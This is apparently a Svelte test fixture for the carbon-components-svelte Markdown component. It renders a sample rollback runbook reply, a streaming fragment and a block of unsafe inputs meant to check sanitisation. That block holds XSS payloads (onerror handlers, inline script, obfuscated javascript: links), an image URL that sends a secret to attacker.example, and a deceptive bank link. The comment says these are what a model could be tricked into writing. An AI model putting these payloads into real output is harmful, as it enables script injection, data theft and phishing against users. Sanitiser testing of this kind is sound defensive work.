<script lang="ts">
  import { Markdown } from "carbon-components-svelte";
  import { tokenize } from "carbon-components-svelte/syntax";
  import "carbon-components-svelte/css/prose.css";
  import "carbon-components-svelte/css/syntax-tokens.css";
  import "carbon-components-svelte/css/syntax.css";

  const reply = `# Rolling back the billing-api release

The 4.12 release raised the p95 latency of \`POST /v1/invoices\` from 180 ms to **2.4 s**. Open the [deployment dashboard](https://deploy.example.com/billing-api), or read https://wiki.example.com/runbooks/billing-api/rollback-and-recovery-procedures-for-failed-releases.

1. Pick the last healthy release, *4.11.3*
2. Confirm the rollback, then watch the error rate:
   - it should fall under 0.5% within five minutes
   - if it doesn't, page the on-call engineer

> Rollbacks don't undo database migrations. Check the migration notes first.

\`\`\`ts
const rollback = await deployments.rollback("billing-api", { to: "4.11.3", reason: "p95 latency regression" });
\`\`\`

| Release | Latency | Error rate | Environment | Deployment | Owner | Dashboard | Rollback |
| :------ | ------: | ---------: | :---------- | :--------- | :---- | :-------- | :------- |
| 4.11.3 | 180 ms | 0.2% | production | blue-green | Payments | observability | available |
| 4.12.0 | 2.4 s | 3.1% | production | blue-green | Payments | observability | recommended |

لتثبيت الحزمة شغّل الأمر \`npm install carbon-components-svelte\` ثم استورد الأنماط.

---

Done.`;

  // What a model could be tricked into writing.
  const unsafe = `<img src=x onerror="window.pwned = 1">

<script>window.pwned = 1${"</"}script>

<iframe srcdoc="<p>x</p>"></iframe>

[a](javascript:window.pwned=1) [b](JaVaScRiPt:window.pwned=1) [c](data:text/html,x)

![d](https://attacker.example/p.png?q=secret) [https://bank.example](https://evil.example/)

[<img src=x onerror=1>](https://example.com)`;
</script>

<div style="max-width: 480px">
  <Markdown data-testid="static" source={reply} highlight={tokenize} />
  <Markdown
    data-testid="streaming"
    source={"Still **typing the answer and `co"}
    streaming
  />
  <Markdown data-testid="unsafe" source={unsafe} />
</div>
